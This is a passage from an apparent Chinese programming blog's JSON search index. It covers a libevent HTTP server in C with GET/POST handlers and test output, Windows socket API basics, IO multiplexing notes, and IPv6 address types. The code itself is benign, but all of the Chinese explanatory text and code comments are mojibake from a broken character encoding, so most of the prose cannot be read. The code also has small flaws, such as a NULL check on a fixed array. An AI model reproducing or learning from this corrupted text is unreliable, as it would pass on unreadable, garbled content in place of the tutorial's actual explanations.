//è·å–uriä¸­çš„å‚æ•°éƒ¨åˆ† query = (char*)evhttp_uri_get_query(decoded); if (query == NULL) &#123; printf(&quot;====line:%d,evhttp_uri_get_query return null\\n&quot;, __LINE__); return NULL; &#125; //æŸ¥è¯¢æŒ‡å®šå‚æ•°çš„å€¼ evhttp_parse_query_str(query, params); query_result = (char*)evhttp_find_header(params, query_char); return query_result;&#125;//å¤„ç†getè¯·æ±‚void http_handler_testget_msg(struct evhttp_request* req, void* arg)&#123; if (req == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;input param req is null.&quot;); return; &#125; char* sign = NULL; char* data = NULL; struct evkeyvalq sign_params = &#123; 0 &#125;; sign = find_http_header(req, &amp;sign_params, &quot;sign&quot;);//è·å–getè¯·æ±‚uriä¸­çš„signå‚æ•° if (sign == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;request uri no param sign.&quot;); &#125; else &#123; printf(&quot;====line:%d,get request param: sign=[%s]\\n&quot;, __LINE__, sign); &#125; data = find_http_header(req, &amp;sign_params, &quot;data&quot;);//è·å–getè¯·æ±‚uriä¸­çš„dataå‚æ•° if (data == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;request uri no param data.&quot;); &#125; else &#123; printf(&quot;====line:%d,get request param: data=[%s]\\n&quot;, __LINE__, data); &#125; printf(&quot;\\n&quot;); //å›å“åº” struct evbuffer* retbuff = NULL; retbuff = evbuffer_new(); if (retbuff == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;retbuff is null.&quot;); return; &#125; evbuffer_add_printf(retbuff, &quot;Receive get request,Thamks for the request!&quot;); evhttp_send_reply(req, HTTP_OK, &quot;Client&quot;, retbuff); evbuffer_free(retbuff);&#125;//å¤„ç†postè¯·æ±‚void http_handler_testpost_msg(struct evhttp_request* req, void* arg)&#123; if (req == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;input param req is null.&quot;); return; &#125; char buf[BUF_MAX] = &#123; 0 &#125;; get_post_message(buf, req);//è·å–è¯·æ±‚æ•°æ®ï¼Œä¸€èˆ¬æ˜¯jsonæ ¼å¼çš„æ•°æ® if (buf == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;get_post_message return null.&quot;); return; &#125; else &#123; //å¯ä»¥ä½¿ç”¨jsonåº“è§£æéœ€è¦çš„æ•°æ® printf(&quot;====line:%d,request data:%s&quot;, __LINE__, buf); &#125; //å›å“åº” struct evbuffer* retbuff = NULL; retbuff = evbuffer_new(); if (retbuff == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;retbuff is null.&quot;); return; &#125; evbuffer_add_printf(retbuff, &quot;Receive Get request,Thamks for the request!&quot;); evhttp_send_reply(req, HTTP_OK, &quot;Client&quot;, retbuff); evbuffer_free(retbuff);&#125;int main()&#123; struct evhttp* http_server = NULL; short http_port = 8081; char* http_addr = &quot;0.0.0.0&quot;;#ifdef _WIN32 &#123; WORD wVersionRequested; WSADATA wsaData; int err; wVersionRequested = MAKEWORD(2, 2); err = WSAStartup(wVersionRequested, &amp;wsaData); if (err != 0) &#123; printf(&quot;WSAStartup failed with error: %d\\n&quot;, err); return 0; &#125; &#125;#endif // _WIN32 //åˆå§‹åŒ– event_init(); //å¯åŠ¨httpæœåŠ¡ç«¯ http_server = evhttp_start(http_addr, http_port); if (http_server == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;http server start failed.&quot;); return -1; &#125; //è®¾ç½®è¯·æ±‚è¶…æ—¶æ—¶é—´(s) evhttp_set_timeout(http_server, 5); //è®¾ç½®äº‹ä»¶å¤„ç†å‡½æ•°ï¼Œevhttp_set_cbé’ˆå¯¹æ¯ä¸€ä¸ªäº‹ä»¶(è¯·æ±‚)æ³¨å†Œä¸€ä¸ªå¤„ç†å‡½æ•°ï¼Œ //åŒºåˆ«äºevhttp_set_gencbå‡½æ•°ï¼Œæ˜¯å¯¹æ‰€æœ‰è¯·æ±‚è®¾ç½®ä¸€ä¸ªç»Ÿä¸€çš„å¤„ç†å‡½æ•° evhttp_set_cb(http_server, &quot;/me/testpost&quot;, http_handler_testpost_msg, NULL); evhttp_set_cb(http_server, &quot;/me/testget&quot;, http_handler_testget_msg, NULL); //å¾ªç¯ç›‘å¬ event_dispatch(); //å®é™…ä¸Šä¸ä¼šé‡Šæ”¾ï¼Œä»£ç ä¸ä¼šè¿è¡Œåˆ°è¿™ä¸€æ­¥ evhttp_free(http_server); return 0;&#125; ä½¿ç”¨ postman è¯·æ±‚ Get 123456789// æ¥å£127.0.0.1:8081/me/testpost// è¯·æ±‚ä½“&#123; &quot;username&quot;: &quot;A&quot;, &quot;password&quot;: &quot;123123Qq&quot;, &quot;reqtime&quot;: &quot;2023å¹´1æœˆ28æ—¥15:44:58&quot;&#125; http-server æ§åˆ¶å°è¾“å‡ºï¼š ====line:65,Got a GET request for ====line:85,path is:/me/testget ====line:92,evhttp_uri_get_query return null ====line:118,request uri no param sign. ====line:65,Got a GET request for ====line:85,path is:/me/testget ====line:92,evhttp_uri_get_query return null ====line:128,request uri no param data. Post 123456789# æ¥å£127.0.0.1:8081/me/testpost// è¯·æ±‚ä½“&#123; &quot;username&quot;: &quot;A&quot;, &quot;password&quot;: &quot;123123Qq&quot;, &quot;reqtime&quot;: &quot;2023å¹´1æœˆ28æ—¥15:44:58&quot;&#125; http-server æ§åˆ¶å°è¾“å‡ºï¼š ====line:27,post len:98 ====line:36,post len:98, copy_len:98 ====line:39,post msg:{ \"username\": \"A\", \"password\": \"123123Qq\", \"reqtime\": \"2023éª?éˆ?8éƒ?5:44:58\" } ====line:168,request data:{ \"username\": \"A\", \"password\": \"123123Qq\", \"reqtime\": \"2023éª?éˆ?8éƒ?5:44:58\" }","tags":[{"name":"ç½‘ç»œç¼–ç¨‹","slug":"ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"libevent","slug":"libevent","permalink":"https://hodlyounger.github.io/tags/libevent/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"B-Code/ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"libevent","slug":"B-Code/ç½‘ç»œç¼–ç¨‹/libevent","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/libevent/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘windows socketä½¿ç”¨Demo","date":"2023-10-27T01:24:02.373Z","path":"B_Code/ç½‘ç»œç¼–ç¨‹/ã€ç½‘ç»œç¼–ç¨‹ã€‘SOCKETç›¸å…³å‡½æ•°/","text":"Windows ä¸‹ Socketç›¸å…³ Windows socket çš„ä½¿ç”¨ ä¸€ã€socket()å‡½æ•°åˆ›å»ºå¥—æ¥å­— Windows ä¸æŠŠå¥—æ¥å­—ä½œä¸ºæ™®é€šæ–‡ä»¶å¯¹å¾…ï¼Œè€Œæ˜¯è¿”å› SOCKET ç±»å‹çš„å¥æŸ„ã€‚ 1SOCKET socket(int af, int type, int protocol); å®ä¾‹ï¼Œåˆ›å»ºTCPå¥—æ¥å­—ï¼š 1SOCKET sock = socket(AF_INET, SOCK_STREAM, 0); //åˆ›å»ºTCPå¥—æ¥å­— äºŒã€bind() 1int bind(SOCKET sock, const struct sockaddr *addr, int addrlen); //Windows sock ä¸º socket æ–‡ä»¶æè¿°ç¬¦ addr ä¸º sockaddr ç»“æ„ä½“å˜é‡çš„æŒ‡é’ˆ addrlen ä¸º addr å˜é‡çš„å¤§å°ï¼Œå¯ç”± sizeof() è®¡ç®—å¾—å‡ºã€‚ 12345678910// åˆ›å»ºå¥—æ¥å­— SOCKET servSock = socket(PF_INET,SOCK_STREAM,IPPROTO_TCP); // ç»‘å®šå¥—æ¥å­— struct sockaddr_in sockAddr; memset (&amp;sockAddr, 0, sizeof(sockAddr)); // æ¯ä¸ªå¥—æ¥å­—éƒ½ç”¨0å¡«å…… sockAddr.sin_family = PF_INET; // ä½¿ç”¨IPv4åœ°å€ sockAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); sockAddr.sin_port = htons(1234); // ç«¯å£ bind(servSock, (SOCKADDR*)&amp;sockAddr, sizeof(SOCKADDR)); sockaddrç»“æ„ä½“ 1234struct sockaddr&#123; sa_family_t sin_family; //åœ°å€æ—ï¼ˆAddress Familyï¼‰ï¼Œä¹Ÿå°±æ˜¯åœ°å€ç±»å‹ char sa_data[14]; //IPåœ°å€å’Œç«¯å£å·&#125;; sockaddr_in ç»“æ„ä½“ 123456struct sockaddr_in&#123; sa_family_t sin_family; //åœ°å€æ—ï¼ˆAddress Familyï¼‰ï¼Œä¹Ÿå°±æ˜¯åœ°å€ç±»å‹ uint16_t sin_port; //16ä½çš„ç«¯å£å· struct in_addr sin_addr; //32ä½IPåœ°å€ char sin_zero[8]; //ä¸ä½¿ç”¨ï¼Œä¸€èˆ¬ç”¨0å¡«å……&#125;; sin_family å’Œsocket()çš„ç¬¬ä¸€ä¸ªå‚æ•°çš„å«ä¹‰ç›¸åŒï¼Œå–å€¼ä¹Ÿè¦ä¿æŒä¸€è‡´ã€‚ sin_prot ä¸ºç«¯å£å·ã€‚uint16_t çš„é•¿åº¦ä¸ºä¸¤ä¸ªå­—èŠ‚ï¼Œç†è®ºä¸Šç«¯å£å·çš„å–å€¼èŒƒå›´ä¸º 0~65536ï¼Œä½† 0~1023 çš„ç«¯å£ä¸€èˆ¬ç”±ç³»ç»Ÿåˆ†é…ç»™ç‰¹å®šçš„æœåŠ¡ç¨‹åºï¼Œä¾‹å¦‚ Web æœåŠ¡çš„ç«¯å£å·ä¸º 80ï¼ŒFTP æœåŠ¡çš„ç«¯å£å·ä¸º 21ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç¨‹åºè¦å°½é‡åœ¨ 1024~65536 ä¹‹é—´åˆ†é…ç«¯å£å·ã€‚ç«¯å£å·éœ€è¦ç”¨ htons() å‡½æ•°è½¬æ¢ï¼Œåé¢ä¼šè®²è§£ä¸ºä»€ä¹ˆã€‚ sin_addr æ˜¯ struct in_addr ç»“æ„ä½“ç±»å‹çš„å˜é‡ï¼Œä¸‹é¢ä¼šè¯¦ç»†è®²è§£ã€‚ sin_zero[8]æ˜¯å¤šä½™çš„8ä¸ªå­—èŠ‚ï¼Œæ²¡æœ‰ç”¨ï¼Œä¸€èˆ¬ä½¿ç”¨ memset() å‡½æ•°å¡«å……ä¸º 0ã€‚ä¸Šé¢çš„ä»£ç ä¸­ï¼Œå…ˆç”¨ memset() å°†ç»“æ„ä½“çš„å…¨éƒ¨å­—èŠ‚å¡«å……ä¸º 0ï¼Œå†ç»™å‰3ä¸ªæˆå‘˜èµ‹å€¼ï¼Œå‰©ä¸‹çš„ sin_zero è‡ªç„¶å°±æ˜¯ 0 äº†ã€‚ in_addr ç»“æ„ä½“ sockaddr_in çš„ç¬¬3ä¸ªæˆå‘˜æ˜¯ in_addr ç±»å‹çš„ç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“åªåŒ…å«ä¸€ä¸ªæˆå‘˜ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123struct in_addr&#123; in_addr_t s_addr; //32ä½çš„IPåœ°å€&#125;; in_addr_t åœ¨å¤´æ–‡ä»¶ &lt;netinet/in.h&gt; ä¸­å®šä¹‰ï¼Œç­‰ä»·äº unsigned longï¼Œé•¿åº¦ä¸º4ä¸ªå­—èŠ‚ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œs_addr æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œè€ŒIPåœ°å€æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥éœ€è¦** inet_addr() **å‡½æ•°è¿›è¡Œè½¬æ¢ï¼Œä¾‹å¦‚ï¼š 12unsigned long ip = inet_addr(&quot;127.0.0.1&quot;);printf(&quot;%ld\\n&quot;, ip); è¿è¡Œç»“æœï¼š 16777343 ä¸‰ã€connect() å‡½æ•° å‚æ•°ä¸bind()ç›¸åŒã€‚ 1int connect(SOCKET sock, const struct sockaddr *serv_addr, int addrlen); //Windows å››ã€listen() å‡½æ•° é€šè¿‡ listen() å‡½æ•°å¯ä»¥è®©å¥—æ¥å­—è¿›å…¥è¢«åŠ¨ç›‘å¬çŠ¶æ€ï¼Œå®ƒçš„åŸå‹ä¸ºï¼š 1int listen(SOCKET sock, int backlog); //Windows sock ä¸ºéœ€è¦è¿›å…¥ç›‘å¬çŠ¶æ€çš„å¥—æ¥å­—ï¼Œbacklog ä¸ºè¯·æ±‚é˜Ÿåˆ—çš„æœ€å¤§é•¿åº¦ã€‚ **è¢«åŠ¨ç›‘å¬ï¼š**æ˜¯æŒ‡å½“æ²¡æœ‰å®¢æˆ·ç«¯è¯·æ±‚æ—¶ï¼Œå¥—æ¥å­—å¤„äºâ€œç¡çœ â€çŠ¶æ€ï¼Œåªæœ‰å½“æ¥æ”¶åˆ°å®¢æˆ·ç«¯è¯·æ±‚æ—¶ï¼Œå¥—æ¥å­—æ‰ä¼šè¢«â€œå”¤é†’â€æ¥å“åº”è¯·æ±‚ã€‚ å¦‚æœå°† backlog çš„å€¼è®¾ç½®ä¸º SOMAXCONNï¼Œå°±ç”±ç³»ç»Ÿæ¥å†³å®šè¯·æ±‚é˜Ÿåˆ—é•¿åº¦ï¼Œè¿™ä¸ªå€¼ä¸€èˆ¬æ¯”è¾ƒå¤§ï¼Œå¯èƒ½æ˜¯å‡ ç™¾ï¼Œæˆ–è€…æ›´å¤šã€‚ å½“è¯·æ±‚é˜Ÿåˆ—æ»¡æ—¶ï¼Œå°±ä¸å†æ¥æ”¶æ–°çš„è¯·æ±‚ï¼Œå¯¹äº Linuxï¼Œå®¢æˆ·ç«¯ä¼šæ”¶åˆ° **ECONNREFUSED **é”™è¯¯ï¼Œå¯¹äº Windowsï¼Œå®¢æˆ·ç«¯ä¼šæ”¶åˆ° **WSAECONNREFUSED **é”™è¯¯ã€‚ æ³¨æ„ï¼šlisten()åªæ˜¯è®©å¥—æ¥å­—å¤„äºç›‘å¬çŠ¶æ€ï¼Œå¹¶æ²¡æœ‰æ¥æ”¶è¯·æ±‚ã€‚æ¥æ”¶è¯·æ±‚éœ€è¦ä½¿ç”¨accept()å‡½æ•°ã€‚ äº”ã€accept() å‡½æ•° å½“å¥—æ¥å­—å¤„äºç›‘å¬çŠ¶æ€æ—¶ï¼Œå¯ä»¥é€šè¿‡ accept()å‡½æ•°æ¥æ¥æ”¶å®¢æˆ·ç«¯è¯·æ±‚ã€‚å®ƒçš„åŸå‹ä¸ºï¼š 1SOCKET accept(SOCKET sock, struct sockaddr *addr, int *addrlen); //Windows å®ƒçš„å‚æ•°ä¸ listen() å’Œ connect() æ˜¯ç›¸åŒçš„ï¼šsockä¸ºæœåŠ¡å™¨ç«¯å¥—æ¥å­—ï¼Œaddrä¸º sockaddr_in ç»“æ„ä½“å˜é‡ï¼Œaddrlenä¸ºå‚æ•° addr çš„é•¿åº¦ï¼Œå¯ç”± sizeof() æ±‚å¾—ã€‚","tags":[{"name":"ç½‘ç»œ","slug":"ç½‘ç»œ","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C/"},{"name":"Socket","slug":"Socket","permalink":"https://hodlyounger.github.io/tags/Socket/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"B-Code/ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘OSIä¸ƒå±‚ç½‘ç»œåè®®æ¨¡å‹å„å±‚åè®®","date":"2023-10-27T01:24:02.372Z","path":"B_Code/ç½‘ç»œç¼–ç¨‹/ã€ç½‘ç»œç¼–ç¨‹ã€‘OSIä¸ƒå±‚ç½‘ç»œåè®®æ¨¡å‹/","text":"","tags":[{"name":"ç½‘ç»œç¼–ç¨‹","slug":"ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"åè®®","slug":"åè®®","permalink":"https://hodlyounger.github.io/tags/%E5%8D%8F%E8%AE%AE/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"B-Code/ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘IOå¤šè·¯å¤ç”¨","date":"2023-10-27T01:24:02.371Z","path":"B_Code/ç½‘ç»œç¼–ç¨‹/ã€ç½‘ç»œç¼–ç¨‹ã€‘IOå¤šè·¯å¤ç”¨/","text":"æœ€è¿‘é¢è¯•ï¼Œå²—ä½æ˜¯å®‰å…¨å¼€å‘å²—ã€‚é—®äº†è¾ƒå¤šçš„ç½‘ç»œç›¸å…³å‡½æ•°ã€‚å…¶ä¸­å…³äºioå¤šè·¯å¤ç”¨çš„é—®é¢˜ï¼Œç”±äºå·¥ä½œä¸­æ¶‰åŠçš„æ¯”è¾ƒå°‘ï¼Œå›ç­”çš„ä¸€å¡Œç³Šæ¶‚ã€‚çŸ¥è€»è€Œåå‹‡ï¼Œä¸“é—¨æ•´ç†ä¸€éè®°å½•ä¸€ä¸‹è¿™ä¸ªçŸ¥è¯†ç‚¹å§ ä¸»è¦æ˜¯ä¹‹å‰è¿˜ä¸“é—¨å†™è¿‡ä¸€éç¬”è®°ç”¨æ¥è®°å½•å½“æ—¶çš„å­¦ä¹ æƒ…å†µï¼Œè¿˜å†™çš„æŒºè¯¦ç»†ï¼ï¼ï¼ ã€ä¸€æ–‡ææ‡‚ã€‘FD_SETçš„ä½¿ç”¨_æ¬§æ©æ„çš„åšå®¢-CSDNåšå®¢ [toc] IOå¤šè·¯å¤ç”¨ æ¦‚å¿µ é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å¯ä»¥å¤šä¸ªå¯ä»¥é‡å¤ä½¿ç”¨çš„ioï¼ˆè¾“å…¥\\è¾“å‡ºï¼‰ã€‚ å¤šè·¯ï¼šæ ¸å¿ƒéœ€æ±‚æ˜¯è¦ç”¨å°½å¯èƒ½å°‘çš„çº¿ç¨‹æ¥å¤„ç†å°½å¯èƒ½å¤šçš„è¿æ¥ï¼Œè¿™é‡Œçš„å¤šè·¯æ˜¯æŒ‡éœ€è¦å¤„ç†çš„ä¼—å¤šè¿æ¥ã€‚ å¤ç”¨ï¼šæ ¸å¿ƒéœ€æ±‚æ˜¯è¦æ±‚ä½¿ç”¨å°½å¯èƒ½å°‘çš„çº¿ç¨‹ï¼Œå°½å¯èƒ½å‡å°‘ç³»ç»Ÿå¼€é”€å»å¤„ç†å°½å¯èƒ½å¤šçš„è¿æ¥ï¼Œé‚£ä¹ˆè¿™ä¸ªå¤ç”¨æ˜¯æŒ‡åˆ©ç”¨æœ‰é™çš„èµ„æºã€‚ä¹Ÿå°±æ˜¯è¯´åˆ©ç”¨æœ‰é™çš„èµ„æºå»å¤„ç†å°½å¯èƒ½å¤šçš„ä»»åŠ¡ã€‚ä¾‹å¦‚ï¼šåœ¨é˜»å¡IOä¸­ï¼Œä¸€ä¸ªè¿æ¥éœ€è¦ä¸€ä¸ªçº¿ç¨‹å»å¤„ç†ï¼Œä½†æ˜¯åœ¨IOå¤šè·¯å¤ç”¨çš„æ¨¡å‹ä¸­ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹å»å¤„ç†å¤šä¸ªä»»åŠ¡ã€‚ å‚è€ƒåŠå¼•ç”¨ï¼š Linux â€“ IO Multiplexing â€“ Select vs Poll vs Epoll â€“ Developers Area Chapter 6. I/O Multiplexing: The select and poll Functions - Shichaoâ€™s Notes select / poll / epoll: practical difference for system architects | UlduzSoft ã€å¹¶å‘ã€‘IOå¤šè·¯å¤ç”¨select/poll/epollä»‹ç»_å“”å“©å“”å“©_bilibili","tags":[{"name":"IOå¤ç”¨","slug":"IOå¤ç”¨","permalink":"https://hodlyounger.github.io/tags/IO%E5%A4%8D%E7%94%A8/"},{"name":"ç½‘ç»œ","slug":"ç½‘ç»œ","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"B-Code/ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘IPv6","date":"2023-10-27T01:24:02.371Z","path":"B_Code/ç½‘ç»œç¼–ç¨‹/ã€ç½‘ç»œç¼–ç¨‹ã€‘IPv6/","text":"[toc] IPv6åœ°å€æ ¼å¼ IPv6çš„åœ°å€é•¿åº¦æ˜¯128ä½ï¼ˆbitï¼‰ã€‚ å°†è¿™128ä½çš„åœ°å€æŒ‰æ¯16ä½åˆ’åˆ†ä¸ºä¸€ä¸ªæ®µï¼Œå°†æ¯ä¸ªæ®µè½¬æ¢æˆåå…­è¿›åˆ¶æ•°å­—ï¼Œå¹¶ç”¨å†’å·éš”å¼€ã€‚ ä¾‹å¦‚ï¼š2000:0000:0000:0000:0001:2345:6789:abcd è¿™ä¸ªåœ°å€å¾ˆé•¿ï¼Œå¯ä»¥ç”¨ä¸¤ç§æ–¹æ³•å¯¹è¿™ä¸ªåœ°å€è¿›è¡Œå‹ç¼©ï¼Œ å‰å¯¼é›¶å‹ç¼©æ³•ï¼š å°†æ¯ä¸€æ®µçš„å‰å¯¼é›¶çœç•¥ï¼Œä½†æ˜¯æ¯ä¸€æ®µéƒ½è‡³å°‘åº”è¯¥æœ‰ä¸€ä¸ªæ•°å­— ä¾‹å¦‚ï¼š2000:0:0:0:1:2345:6789:abcd åŒå†’å·æ³•ï¼š å¦‚æœä¸€ä¸ªä»¥å†’å·åå…­è¿›åˆ¶æ•°è¡¨ç¤ºæ³•è¡¨ç¤ºçš„IPv6åœ°å€ä¸­ï¼Œå¦‚æœå‡ ä¸ªè¿ç»­çš„æ®µå€¼éƒ½æ˜¯0ï¼Œé‚£ä¹ˆè¿™äº›0å¯ä»¥ç®€è®°ä¸º::ã€‚æ¯ä¸ªåœ°å€ä¸­åªèƒ½æœ‰ä¸€ä¸ª::ã€‚ ä¾‹å¦‚ï¼š2000::1:2345:6789:abcd å•æ’­åœ°å€ï¼ˆUnicast IPv6 Addressesï¼‰ å¯èšåˆçš„å…¨çƒå•æ’­åœ°å€ï¼ˆAggregatable Global Unicast Addressesï¼‰ å¯åœ¨å…¨çƒèŒƒå›´å†…è·¯ç”±å’Œåˆ°è¾¾çš„ï¼Œç›¸å½“äºIPv4é‡Œé¢çš„global addressesã€‚å‰ä¸‰ä¸ªbitæ˜¯001 ä¾‹å¦‚ï¼š2000::1:2345:6789:abcd é“¾è·¯æœ¬åœ°åœ°å€ï¼ˆLink-Local Addressesï¼‰ ç”¨äºåŒä¸€ä¸ªé“¾è·¯ä¸Šçš„ç›¸é‚»èŠ‚ç‚¹ä¹‹é—´é€šä¿¡ï¼Œç›¸å½“äºIPv4é‡Œé¢çš„169.254.0.0/16åœ°å€ã€‚Ipv6çš„è·¯ç”±å™¨ä¸ä¼šè½¬å‘é“¾è·¯æœ¬åœ°åœ°å€çš„æ•°æ®åŒ…ã€‚å‰10ä¸ªbitæ˜¯1111 1110 10ï¼Œç”±äºæœ€åæ˜¯64bitçš„interface IDï¼Œæ‰€ä»¥å®ƒçš„å‰ç¼€æ€»æ˜¯FE80::/64 ä¾‹å¦‚ï¼šFE80::1 ç«™ç‚¹æœ¬åœ°åœ°å€ï¼ˆSite-Local Addressesï¼‰ å¯¹äºæ— æ³•è®¿é—®internetçš„æœ¬åœ°ç½‘ç»œï¼Œå¯ä»¥ä½¿ç”¨ç«™ç‚¹æœ¬åœ°åœ°å€ï¼Œè¿™ä¸ªç›¸å½“äºIPv4é‡Œé¢çš„private addressï¼ˆ10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16ï¼‰ã€‚å®ƒçš„å‰10ä¸ªbitæ˜¯1111 1110 11ï¼Œå®ƒæœ€åæ˜¯16bitçš„Subnet IDå’Œ64bitçš„interface IDï¼Œæ‰€ä»¥å®ƒçš„å‰ç¼€æ˜¯FEC0::/48ã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨RFC3879ä¸­ï¼Œæœ€ç»ˆå†³å®šæ”¾å¼ƒå•æ’­ç«™ç‚¹æœ¬åœ°åœ°å€ã€‚æ”¾å¼ƒçš„ç†ç”±æ˜¯ï¼Œç”±äºå…¶å›ºæœ‰çš„äºŒä¹‰æ€§å¸¦æ¥çš„å•æ’­ç«™ç‚¹æœ¬åœ°åœ°å€çš„å¤æ‚æ€§è¶…è¿‡äº†å®ƒä»¬å¯èƒ½å¸¦æ¥çš„å¥½å¤„ã€‚å®ƒåœ¨RFC4193ä¸­è¢«ULAå–ä»£ã€‚ å”¯ä¸€çš„æœ¬åœ°IPv6å•æ’­åœ°å€ï¼ˆULAï¼ŒUnique Local IPv6 Unicast Addressï¼‰ åœ¨RFC4193ä¸­æ ‡å‡†åŒ–äº†ä¸€ç§ç”¨æ¥åœ¨æœ¬åœ°é€šä¿¡ä¸­å–ä»£å•æ’­ç«™ç‚¹æœ¬åœ°åœ°å€çš„åœ°å€ã€‚ULAæ‹¥æœ‰å›ºå®šå‰ç¼€FD00::/8ï¼Œåé¢è·Ÿä¸€ä¸ªè¢«ç§°ä¸ºå…¨å±€IDçš„40bitéšæœºæ ‡è¯†ç¬¦ã€‚ æœªæŒ‡å®šåœ°å€ï¼ˆUnspecified addressï¼‰ 0:0:0:0:0:0:0:0 æˆ–è€…:: å½“ä¸€ä¸ªæœ‰æ•ˆåœ°å€è¿˜ä¸èƒ½ç¡®å®šï¼Œä¸€èˆ¬ç”¨æœªæŒ‡å®šåœ°å€ä½œä¸ºæºåœ°å€ã€‚æœªæŒ‡å®šåœ°å€ä¸èƒ½ä½œä¸ºä¸€ä¸ªç›®æ ‡åœ°å€æ¥ä½¿ç”¨ã€‚ å›ç¯åœ°å€ï¼ˆLoopback addressï¼‰ å›ç¯åœ°å€::1ç”¨äºæ ‡è¯†ä¸€ä¸ªå›ç¯æ¥å£ï¼Œå¯ä»¥ä½¿ä¸€ä¸ªèŠ‚ç‚¹å¯ä»¥ç»™è‡ªå·±å‘é€æ•°æ®åŒ…ã€‚ç›¸å½“äºIPv4çš„å›ç¯åœ°å€127.0.0.1 å…¼å®¹IPv4çš„åœ°å€ï¼ˆIPv4-compatible addressï¼‰ å½¢å¦‚::w.x,y.zï¼Œè¿™é‡Œçš„w.x.y.zæ˜¯IPv4å…¬å…±åœ°å€çš„åè¿›åˆ¶ç‚¹å·è¡¨ç¤ºæ³•ï¼Œç”¨äºIPv6/IPv4èŠ‚ç‚¹ä»¬ï¼ˆåŒæ—¶æ”¯æŒï¼‰åœ¨ä½¿ç”¨ä»…æ”¯æŒIPv4çš„ç½‘ç»œä¸Šç”¨IPv6çš„åè®®è¿›è¡Œé€šä¿¡ã€‚ ä½†æ˜¯äº‹å®è¯æ˜è¿™ç§æŠ€æœ¯ä¸æ˜¯ä¸ªå¥½ä¸»æ„ï¼ŒRFC4291ä¸­åºŸå¼ƒäº†å¯¹è¿™ç±»åœ°å€çš„ä½¿ç”¨ã€‚ IPv4æ˜ å°„åœ°å€ï¼ˆIPv4-mapped addressï¼‰ å½¢å¦‚::FFFF:w.x.y.zï¼Œè¿™é‡Œçš„w.x.y.zæ˜¯IPv4å…¬å…±åœ°å€çš„åè¿›åˆ¶ç‚¹å·è¡¨ç¤ºæ³•,ç”¨äºä¸€ä¸ªä»…æ”¯æŒIPv4çš„èŠ‚ç‚¹è¡¨ç°ä¸ºä¸€ä¸ªIPv6çš„èŠ‚ç‚¹ 6over4åœ°å€ [64bit-prefix]:0:0:WWXX:YYZZ,å…¶ä¸­çš„WWXX:YYZZæ˜¯w.x.y.z IPv4å…¬å…±åœ°å€çš„åè¿›åˆ¶ç‚¹å·è¡¨ç¤ºæ³•ï¼Œç”¨äºä¸€ä¸ªä½¿ç”¨6to4åè®®çš„éš§é“æœºåˆ¶çš„èŠ‚ç‚¹ã€‚ 6to4åœ°å€ 2002:WWXX:YYZZ:[SLA ID]:[Interface ID],ç”¨äºè¡¨ç¤ºä¸€ä¸ªä½¿ç”¨6to4åè®®çš„éš§é“æœºåˆ¶èŠ‚ç‚¹ã€‚ å¤šæ’­IPv6åœ°å€ï¼ˆMulticast IPv6 Addressesï¼‰ å‰8ä¸ªbitä¸º1111 1111ï¼Œ å…¶ä¸­FF01::åˆ°FF0F::çš„å¤šæ’­åœ°å€æ˜¯ä¿ç•™ä¸“ç”¨åœ°å€ FF01::1 